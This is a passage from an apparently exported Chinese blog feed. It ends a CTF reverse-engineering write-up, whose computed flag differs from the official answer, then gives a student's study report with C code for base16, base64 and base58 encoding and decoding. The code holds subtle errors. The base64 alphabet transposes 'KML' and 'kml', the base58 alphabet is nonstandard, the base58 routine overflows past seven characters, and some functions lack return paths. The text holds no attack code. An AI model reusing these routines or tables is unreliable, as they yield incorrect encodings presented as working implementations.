class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>​    最终代码运行结果不是wp的答案那种而是D8g7{TherefIsfAfLongfWa6fTofGof}</p>
<p>wp中答案则是</p>
<p>D0g3{There_Is_A_Long_Way_To_Go_}</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>实验室报告</category>
      </categories>
  </entry>
  <entry>
    <title>学习报告（三到四周）</title>
    <url>/2023/01/05/Re/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8A%A5%E5%91%8A/%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A%EF%BC%88%E4%B8%89%E5%88%B0%E5%9B%9B%E5%91%A8%EF%BC%89/</url>
    <content><![CDATA[<h1 id="学习报告（三到四周）"><a href="#学习报告（三到四周）" class="headerlink" title="学习报告（三到四周）"></a>学习报告（三到四周）</h1><h2 id="base16"><a href="#base16" class="headerlink" title="base16"></a>base16</h2><p>可通过位运算（高效率）进行加密</p>
<p>基本已经知道其加密模式</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> table[] = &#123; <span class="string">&quot;0123456789ABCDEF&quot;</span> &#125;;<span class="comment">//字典</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">r</span><span class="params">( <span class="type">char</span> m)</span><span class="comment">//一个字符将被加密为两个字符可分为左右</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a;</span><br><span class="line">    a=m&lt;&lt;<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">return</span> a &gt;&gt; <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">l</span><span class="params">(<span class="type">char</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a;</span><br><span class="line">    a = n;</span><br><span class="line">    <span class="keyword">return</span> (a&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">check</span><span class="params">( <span class="type">char</span> a, <span class="type">char</span>* b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> c;<span class="comment">//将char转为无符号的</span></span><br><span class="line">    <span class="keyword">for</span> (c = <span class="number">0</span>; c &lt;= <span class="number">15</span>; c++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a == *(b + c))<span class="comment">//检索字典寻找其四位对应值</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> flag, a, b, c, f;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;选择模式加密0/解密1:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;flag);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span> (flag == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="type">char</span> yuan[<span class="number">100</span>], jia[<span class="number">200</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入待加密的字符:&quot;</span>);</span><br><span class="line">            fgets(yuan,<span class="number">100</span>,<span class="built_in">stdin</span>);</span><br><span class="line">            <span class="keyword">for</span> (a = <span class="number">0</span>; <span class="number">1</span>; a++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (yuan[a] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (b = <span class="number">0</span>, f = <span class="number">0</span>; b &lt; (<span class="number">2</span> * a); b += <span class="number">2</span>, f++)</span><br><span class="line">            &#123;</span><br><span class="line">                jia[b] = table[l(yuan[f])];</span><br><span class="line">                jia[b + <span class="number">1</span>] = table[r(yuan[f])];</span><br><span class="line">            &#125;</span><br><span class="line">            jia[<span class="number">2</span> * a] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            <span class="built_in">puts</span>(jia);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (flag == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> jiami[<span class="number">100</span>], jiemi[<span class="number">50</span>], e;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入待解密的字符:&quot;</span>);</span><br><span class="line">        fgets(jiami,<span class="number">100</span>,<span class="built_in">stdin</span>);</span><br><span class="line">        <span class="keyword">for</span> (a = <span class="number">0</span>; <span class="number">1</span>; a++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (jiami[a] == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                jiami[a] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (b = <span class="number">0</span>, c = <span class="number">0</span>; b &lt; a; b += <span class="number">2</span>, c++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            jiemi[c] = ((check(jiami[b], table) &lt;&lt; <span class="number">4</span>) + check(jiami[b + <span class="number">1</span>], table));</span><br><span class="line">        &#125;</span><br><span class="line">        jiemi[(a) / <span class="number">2</span> <span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(jiemi);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;输入错误&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>与base16类似都可以通过位运算进行加密</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> zidian[]=&#123;<span class="string">&quot;ABCDEFGHIJKMLNOPQRSTUVWXYZabcdefghijkmlnopqrstuvwxyz0123456789+/&quot;</span>&#125;;<span class="comment">//字典</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">base64</span><span class="params">(<span class="type">char</span> *jiami,<span class="type">int</span> n,<span class="type">char</span> *jiemi)</span><span class="comment">//加密操作</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> a;<span class="comment">//vsc中char有符号</span></span><br><span class="line"><span class="type">int</span> b,c;</span><br><span class="line"><span class="keyword">if</span>(n%<span class="number">3</span>==<span class="number">0</span>)<span class="comment">//每三个字符生成四个字符的密文，此处判断是否满足能被三整除以判断是否需要补位</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(b=<span class="number">0</span>,c=<span class="number">0</span>;b&lt;(n-(n%<span class="number">3</span>));c+=<span class="number">4</span>,b+=<span class="number">3</span>)<span class="comment">//这几处位运算分开是因为位运算特性:运算结束后补0</span></span><br><span class="line">&#123;</span><br><span class="line">    a=jiami[b]&gt;&gt;<span class="number">2</span>;<span class="comment">//取char型的高6位</span></span><br><span class="line">    jiemi[c]=zidian[a];</span><br><span class="line">    a=jiami[b]&lt;&lt;<span class="number">6</span>;</span><br><span class="line">    jiemi[c+<span class="number">1</span>]=zidian[(a&gt;&gt;<span class="number">2</span>)+(jiami[b+<span class="number">1</span>]&gt;&gt;<span class="number">4</span>)];<span class="comment">//取前一个char的低2位和后一个的高4位</span></span><br><span class="line">    a=jiami[b+<span class="number">1</span>]&lt;&lt;<span class="number">4</span>;</span><br><span class="line">    jiemi[c+<span class="number">2</span>]=zidian[(a&gt;&gt;<span class="number">2</span>)+(jiami[b+<span class="number">2</span>]&gt;&gt;<span class="number">6</span>)];<span class="comment">//取前一个char的低4位和后一个的高二位</span></span><br><span class="line">    a=jiami[b+<span class="number">2</span>]&lt;&lt;<span class="number">2</span>;</span><br><span class="line">    jiemi[c+<span class="number">3</span>]=zidian[a&gt;&gt;<span class="number">2</span>];<span class="comment">//取最后一个的低6位 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n%<span class="number">3</span>==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(b=<span class="number">0</span>,c=<span class="number">0</span>;b&lt;(n-(n%<span class="number">3</span>));c+=<span class="number">4</span>,b+=<span class="number">3</span>)<span class="comment">//这几处位运算分开是因为位运算特性:运算结束后补0</span></span><br><span class="line">&#123;</span><br><span class="line">    a=jiami[b]&gt;&gt;<span class="number">2</span>;</span><br><span class="line">    jiemi[c]=zidian[a];</span><br><span class="line">    a=jiami[b]&lt;&lt;<span class="number">6</span>;</span><br><span class="line">    jiemi[c+<span class="number">1</span>]=zidian[(a&gt;&gt;<span class="number">2</span>)+(jiami[b+<span class="number">1</span>]&gt;&gt;<span class="number">4</span>)];</span><br><span class="line">    a=jiami[b+<span class="number">1</span>]&lt;&lt;<span class="number">4</span>;</span><br><span class="line">    jiemi[c+<span class="number">2</span>]=zidian[(a&gt;&gt;<span class="number">2</span>)+(jiami[b+<span class="number">2</span>]&gt;&gt;<span class="number">6</span>)];</span><br><span class="line">    a=jiami[b+<span class="number">2</span>]&lt;&lt;<span class="number">2</span>;</span><br><span class="line">    jiemi[c+<span class="number">3</span>]=zidian[a&gt;&gt;<span class="number">2</span>]; </span><br><span class="line">&#125;<span class="comment">//因为余一，所以取最后的字符的高六位，作为一个字符，剩下的二位与四个0组成下个字符，剩下的两个密文字符全由0补齐</span></span><br><span class="line">a=jiami[b]&gt;&gt;<span class="number">2</span>;</span><br><span class="line">jiemi[c]=zidian[a];</span><br><span class="line">a=jiami[b]&lt;&lt;<span class="number">6</span>;</span><br><span class="line">jiemi[c+<span class="number">1</span>]=zidian[a&gt;&gt;<span class="number">2</span>];</span><br><span class="line">jiemi[c+<span class="number">2</span>]=zidian[<span class="number">0</span>];</span><br><span class="line">jiemi[c+<span class="number">3</span>]=zidian[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(b=<span class="number">0</span>,c=<span class="number">0</span>;b&lt;(n-(n%<span class="number">3</span>));c+=<span class="number">4</span>,b+=<span class="number">3</span>)<span class="comment">//这几处位运算分开是因为位运算特性:运算结束后补0</span></span><br><span class="line">&#123;</span><br><span class="line">    a=jiami[b]&gt;&gt;<span class="number">2</span>;</span><br><span class="line">    jiemi[c]=zidian[a];</span><br><span class="line">    a=jiami[b]&lt;&lt;<span class="number">6</span>;</span><br><span class="line">    jiemi[c+<span class="number">1</span>]=zidian[(a&gt;&gt;<span class="number">2</span>)+(jiami[b+<span class="number">1</span>]&gt;&gt;<span class="number">4</span>)];</span><br><span class="line">    a=jiami[b+<span class="number">1</span>]&lt;&lt;<span class="number">4</span>;</span><br><span class="line">    jiemi[c+<span class="number">2</span>]=zidian[(a&gt;&gt;<span class="number">2</span>)+(jiami[b+<span class="number">2</span>]&gt;&gt;<span class="number">6</span>)];</span><br><span class="line">    a=jiami[b+<span class="number">2</span>]&lt;&lt;<span class="number">2</span>;</span><br><span class="line">    jiemi[c+<span class="number">3</span>]=zidian[a&gt;&gt;<span class="number">2</span>]; </span><br><span class="line">&#125;<span class="comment">//因为余二，所以取最后的字符的高六位，作为一个字符，剩下的二位与下个字符的高四位组成下个字符，剩下的两位与四位0补齐，最后的剩下的一个密文字符全由0补齐</span></span><br><span class="line">a=jiami[b]&gt;&gt;<span class="number">2</span>;</span><br><span class="line">jiemi[c]=zidian[a];</span><br><span class="line">a=jiami[b]&lt;&lt;<span class="number">6</span>;</span><br><span class="line">jiemi[c+<span class="number">1</span>]=zidian[(a&gt;&gt;<span class="number">2</span>)+(jiami[b+<span class="number">1</span>]&gt;&gt;<span class="number">4</span>)];</span><br><span class="line">a=jiami[b+<span class="number">1</span>]&lt;&lt;<span class="number">4</span>;</span><br><span class="line">jiemi[c+<span class="number">2</span>]=zidian[a&gt;&gt;<span class="number">2</span>];</span><br><span class="line">jiemi[c+<span class="number">3</span>]=zidian[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">a=((n-n%<span class="number">3</span>)/<span class="number">3</span>)+<span class="number">1</span>;</span><br><span class="line">jiemi[<span class="number">4</span>*a]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">found</span><span class="params">(<span class="type">char</span> jiami)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a;<span class="comment">//char具有符号会出现复数等离奇情况 unsigned char无符号则无此情况</span></span><br><span class="line">    <span class="keyword">for</span>(a=<span class="number">0</span>;a&lt;<span class="number">64</span>;a++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(jiami==zidian[a])<span class="comment">//与字典对应寻找密文对应的6位二进制数</span></span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">base64jiemi</span><span class="params">(<span class="type">char</span> *jiami,<span class="type">int</span> n,<span class="type">char</span> *jiemi)</span><span class="comment">//解密操作</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a,b;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> c;<span class="comment">//char具有符号会出现复数等离奇情况 unsigned char无符号则无此情况</span></span><br><span class="line">    <span class="keyword">for</span>(a=<span class="number">0</span>,b=<span class="number">0</span>;a&lt;n;a+=<span class="number">4</span>,b+=<span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        jiemi[b]=(found(jiami[a])&lt;&lt;<span class="number">2</span>)+(found(jiami[a+<span class="number">1</span>])&gt;&gt;<span class="number">4</span>);<span class="comment">//8bit数需要6位和2位拼接此处都为拼接操作</span></span><br><span class="line">        c=found(jiami[a+<span class="number">1</span>])&lt;&lt;<span class="number">4</span>;</span><br><span class="line">        jiemi[b+<span class="number">1</span>]=c+(found(jiami[a+<span class="number">2</span>])&gt;&gt;<span class="number">2</span>);</span><br><span class="line">        c=found(jiami[a+<span class="number">2</span>])&lt;&lt;<span class="number">6</span>;</span><br><span class="line">        jiemi[b+<span class="number">2</span>]=c+found(jiami[a+<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> n,m,flag;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请选择加密/解密 0/1&quot;</span>);<span class="comment">//加密解密二合一</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;flag);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入加密长度&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">getchar();<span class="comment">//吸掉回车</span></span><br><span class="line"><span class="type">char</span> *jiami=(<span class="type">char</span>*)<span class="built_in">calloc</span>(n,<span class="keyword">sizeof</span>(<span class="type">char</span>));<span class="comment">//申请连续的内存作为数组使用</span></span><br><span class="line">fgets(jiami,n,<span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">for</span>(m=<span class="number">0</span>;m&lt;n;m++)</span><br><span class="line"><span class="keyword">if</span>(jiami[m]==<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    jiami[m]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *jiemi=(<span class="type">char</span>*)<span class="built_in">calloc</span>(<span class="number">4</span>*(((n-n%<span class="number">3</span>)/<span class="number">3</span>)+<span class="number">1</span>)<span class="number">-1</span>,<span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">base64(jiami,m,jiemi);</span><br><span class="line"><span class="built_in">puts</span>(jiemi);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(flag==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入解密长度&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">getchar();<span class="comment">//吸掉回车</span></span><br><span class="line"><span class="type">char</span> *jiami=(<span class="type">char</span>*)<span class="built_in">calloc</span>(n,<span class="keyword">sizeof</span>(<span class="type">char</span>));<span class="comment">//申请连续的内存作为数组使用</span></span><br><span class="line">fgets(jiami,n,<span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">for</span>(m=<span class="number">0</span>;m&lt;n;m++)</span><br><span class="line"><span class="keyword">if</span>(jiami[m]==<span class="string">&#x27;\n&#x27;</span>)<span class="comment">//fgets会吸掉回车，可以以回车来作为结束符</span></span><br><span class="line">&#123;</span><br><span class="line">    jiami[m]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *jiemi=(<span class="type">char</span>*)<span class="built_in">calloc</span>(m,<span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">base64jiemi(jiami,m,jiemi);</span><br><span class="line"><span class="built_in">puts</span>(jiemi);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="base58"><a href="#base58" class="headerlink" title="base58"></a>base58</h2><p>进行大数运算将256进制转化为58进制，但longlongint有长度限制，此代码无法完全计算出超过7个字符的加密结果</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> zidian[] = <span class="string">&quot;123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> e=<span class="number">98</span>;</span><br><span class="line"><span class="comment">//下面为加密所用函数</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">cifang</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> n)</span><span class="comment">//计算a的n次方方便进行每次都取到两位来与字典一一对应</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)a * cifang(a, n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">zhuanhua10</span><span class="params">(<span class="type">char</span>* a, <span class="type">int</span> n)</span><span class="comment">//转化为十进制数</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>) * a;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)((*(a + n - <span class="number">1</span>)) + (zhuanhua10(a, n - <span class="number">1</span>) * <span class="number">256</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">zhuanhua58</span><span class="params">(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> n, <span class="type">int</span>* p, <span class="type">int</span>* flag)</span><span class="comment">//转化为58进制数同时每两位表示一个58进制方便对字典进行比较</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (*flag == <span class="number">0</span>)<span class="comment">//*p用来计算所存在的字符串长度方便从高位到低位输出，同时方便创造存放加密后密文的数组</span></span><br><span class="line">	&#123;</span><br><span class="line">		*p = *p + <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (n % <span class="number">58</span> == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (*flag == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			*p = *p - <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> n % <span class="number">58</span> + zhuanhua58((<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(n - n % <span class="number">58</span>) / <span class="number">58</span>, p, flag) * <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">base58</span><span class="params">(<span class="type">char</span>* jiami, <span class="type">int</span> n, <span class="type">int</span>* p, <span class="type">char</span>* jiemi, <span class="type">int</span>* flag)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a, b;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> c;</span><br><span class="line">	c = zhuanhua58(zhuanhua10(jiami, n), p, flag);</span><br><span class="line">	<span class="keyword">for</span> (a = *p, b = <span class="number">0</span>; a &gt; <span class="number">0</span>; a--, b++)</span><br><span class="line">	&#123;</span><br><span class="line">		jiemi[b] = zidian[(c / cifang(<span class="number">100</span>, a)) - (c / cifang(<span class="number">100</span>, a + <span class="number">1</span>)) * <span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	jiemi[b + <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//下面为解密所用函数</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">jiaoyan</span><span class="params">(<span class="type">char</span> a)</span><span class="comment">//与字典进行比较找到对应的58进制值</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> b;</span><br><span class="line">	<span class="keyword">for</span>(b=<span class="number">0</span>;<span class="number">1</span>;b++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(a==zidian[b])</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> b;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">huifu10</span><span class="params">(<span class="type">char</span> *jiami,<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> n)</span><span class="comment">//将58进制值转化为10进制值</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> jiaoyan(jiami[n])+huifu10(jiami,n<span class="number">-1</span>)*<span class="number">58</span>;<span class="comment">//从n开始是因为输入的数组第0位为高位，后位为低位，从最低位开始方便进行进制转化,且因为58进制数每位都要占两位所以乘了100</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">huifu256</span><span class="params">(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> n%<span class="number">256</span>+huifu256((n-n%<span class="number">256</span>)/<span class="number">256</span>)*<span class="number">1000</span>;<span class="comment">//将10进制数转化为256进制（与ascii码对应）</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">base58jiemi</span><span class="params">(<span class="type">char</span> *jiemi,<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(n%<span class="number">1000</span>==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	e++;<span class="comment">//因为要输入所以前移一位但此时以经没有输入了就让数组指向最高位字符</span></span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">jiemi[e]=n%<span class="number">1000</span>;<span class="comment">//取低三位获取低位值</span></span><br><span class="line">e--;<span class="comment">//将数组前移一位</span></span><br><span class="line">base58jiemi(jiemi,n/<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请选择加密/解密：0/1&quot;</span>);</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="keyword">switch</span>(n)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入字符数&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="type">char</span>* jiami = (<span class="type">char</span>*)<span class="built_in">calloc</span>(n+<span class="number">2</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">	fgets(jiami, n+<span class="number">2</span>, <span class="built_in">stdin</span>);</span><br><span class="line">	<span class="type">int</span> jishu = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> fla = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span>* flag = &amp;fla;</span><br><span class="line">	<span class="type">int</span>* pjishu = &amp;jishu;</span><br><span class="line">	<span class="keyword">for</span> (n = <span class="number">0</span>; <span class="number">1</span>; n++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (jiami[n] == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			jiami[n] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	zhuanhua58(zhuanhua10(jiami, n), pjishu, flag);</span><br><span class="line">	*flag = <span class="number">1</span>;</span><br><span class="line">	<span class="type">char</span>* jiemi = (<span class="type">char</span>*)<span class="built_in">calloc</span>(*pjishu + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">	base58(jiami, n, pjishu, jiemi, flag);</span><br><span class="line">	<span class="built_in">puts</span>(jiemi);</span><br><span class="line">	&#125;;<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入字符数&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="type">char</span>* jiami = (<span class="type">char</span>*)<span class="built_in">calloc</span>(n+<span class="number">2</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">	fgets(jiami, n+<span class="number">2</span>, <span class="built_in">stdin</span>);</span><br><span class="line">	<span class="keyword">for</span> (n = <span class="number">0</span>; <span class="number">1</span>; n++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (jiami[n] == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		